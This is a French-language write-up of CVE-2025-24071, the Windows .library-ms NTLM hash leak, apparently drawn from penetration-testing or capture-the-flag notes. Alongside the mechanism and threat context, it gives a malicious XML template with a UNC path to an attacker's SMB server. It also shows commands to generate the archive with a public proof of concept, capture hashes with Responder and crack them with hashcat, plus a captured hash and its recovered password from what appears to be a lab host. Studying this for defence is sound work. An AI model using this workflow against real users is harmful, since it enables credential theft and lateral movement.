# Fuite de hash NTLM via fichiers .library-ms

## <mark style="color:red;">CVE-2025-24071 : Fuite de hash NTLM via fichiers .library-ms</mark>

### <mark style="color:blue;">Vue d'ensemble</mark>

**CVE-2025-24071** (renommé CVE-2025-24054 par Microsoft) est une vulnérabilité de type "spoofing" dans Windows Explorer permettant de voler des hashes NTLM d'utilisateurs sans aucune interaction explicite, simplement en extrayant une archive ZIP/RAR contenant un fichier `.library-ms` malveillant.

> ⚠️ **Statut** : Corrigé par Microsoft lors du Patch Tuesday de mars 2025\
> 🎯 **Exploitation** : Observée dans la nature (wild), potentiellement vendue sur des forums underground

***

### <mark style="color:blue;">Principe technique</mark>

#### <mark style="color:green;">Qu'est-ce qu'un fichier</mark> <mark style="color:green;"></mark><mark style="color:green;">`.library-ms`</mark> <mark style="color:green;"></mark><mark style="color:green;">?</mark>

Un fichier `.library-ms` est un fichier XML utilisé par Windows Explorer pour définir des **bibliothèques** (libraries) — des vues agrégées de plusieurs dossiers. Windows fait confiance à ce format et le parse automatiquement pour afficher métadonnées, icônes et prévisualisations.

**Structure XML typique :**

```xml
<libraryDescription>
  <simpleLocation>
    <url>\\192.168.1.116\shared</url>
  </simpleLocation>
</libraryDescription>
```

#### <mark style="color:green;">Chaîne d'exploitation</mark>

1. **Extraction de l'archive**\
   L'attaquant crée un fichier `.library-ms` malveillant contenant un chemin UNC pointant vers un serveur SMB contrôlé (`\\IP_attaquant\share`)
2. **Parsing automatique**\
   Lorsque l'archive (ZIP/RAR) est extraite, Windows Explorer et le service d'indexation (`SearchProtocolHost.exe`) lisent automatiquement le fichier pour :
   * Générer des icônes et aperçus
   * Indexer les métadonnées
   * **Aucune ouverture manuelle requise**
3. **Connexion SMB implicite**\
   Windows tente de résoudre le chemin réseau SMB pour récupérer les ressources (icônes, métadonnées)
4. **Authentification NTLM automatique**\
   Le système initie une authentification NTLM transparente et envoie le **hash NTLMv2** de l'utilisateur au serveur attaquant
5. **Capture et exploitation**\
   L'attaquant capture le hash et peut :
   * Le **cracker hors ligne** pour obtenir le mot de passe en clair
   * L'utiliser en **pass-the-hash** ou **NTLM relay** pour s'authentifier sur d'autres systèmes

***

### <mark style="color:blue;">Preuves techniques</mark>

#### <mark style="color:green;">Analyse Process Monitor (Procmon)</mark>

Les logs Procmon montrent les opérations automatiques effectuées par `Explorer.exe` et `SearchProtocolHost.exe` immédiatement après extraction :

```
CreateFile → ReadFile → QueryBasicInformationFile → CloseFile
```

* **Explorer.exe** : Parse initial pour affichage
* **SearchProtocolHost.exe** : Indexation pour la recherche Windows

#### <mark style="color:green;">Capture réseau Wireshark</mark>

Avec un filtre SMB (`smb or smb2`), on observe :

1. **SMB2 Negotiate Protocol Request** (victime → attaquant)
2. **SMB2 Session Setup Request (NTLMSSP\_AUTH)** contenant le hash NTLM

> 💡 Même si le fichier est déplacé dans la corbeille, le mécanisme reste actif !

***

### <mark style="color:blue;">Exploitation pratique</mark>

#### Génération du payload

```bash
git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
cd CVE-2025-24071_PoC
python3 poc.py
```

**Configuration :**

```
Enter your file name: exploit.zip
Enter IP (EX: 192.168.1.162): 10.10.14.17
```

Le script génère une archive contenant le fichier `.library-ms` malveillant.

#### Capture des hashes avec Responder

```bash
sudo responder -I tun0 -v
```

**Résultat après extraction par la victime :**

```
[SMB] NTLMv2-SSP Client   : 10.10.11.93
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:3fb1c475e8b791d0:CD4B85E01204B6B6D9D14A677AB55729:...
```

#### Cracking avec Hashcat

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Résultat :**

```
web_svc::NANOCORP:...:dksehdgh712!@#
```

**Credentials récupérés :**

* Utilisateur : `web_svc`
* Mot de passe : `dksehdgh712!@#`

***

### <mark style="color:blue;">Contexte de menace</mark>

#### Exploitation dans la nature

* **Acteur identifié** : Krypt0n (développeur d'EncryptHub Stealer)
* **Vecteur** : Vendu sur le forum XSS (dark web russophone)
*   **Citation du threat actor** :

    > "Le fichier placé dans le dossier partagé n'a pas besoin d'être ouvert. Si l'utilisateur ouvre simplement l'Explorateur ou accède au dossier partagé, une redirection automatique se produit et le hash est envoyé à votre serveur."

***

### Références

* **CVE** : CVE-2025-24071 → CVE-2025-24054 (mis à jour par Microsoft)
* **PoC** : https://github.com/0x6rss/CVE-2025-24071\_PoC
* **Bulletin Microsoft** : CVE-2025-24054 (Windows File Explorer Spoofing Vulnerability)
* **Découvreur** : 0x6rss (Malware & CTI Analyst)

***

### Résumé

| Élément                 | Détail                                          |
| ----------------------- | ----------------------------------------------- |
| **Type d'attaque**      | Vol de credentials (NTLM hash leak)             |
| **Vecteur**             | Fichier `.library-ms` dans archive ZIP/RAR      |
| **Interaction requise** | Aucune (extraction suffit)                      |
| **Impact**              | Compromission de credentials, mouvement latéral |
| **Patch**               | Mars 2025                                       |
| **Exploitation**        | Confirmée dans la nature                        |

> ⚠️ **Point clé** : Aucune exécution de code n'est nécessaire — la simple lecture/prévisualisation déclenche la connexion réseau et l'authentification NTLM.
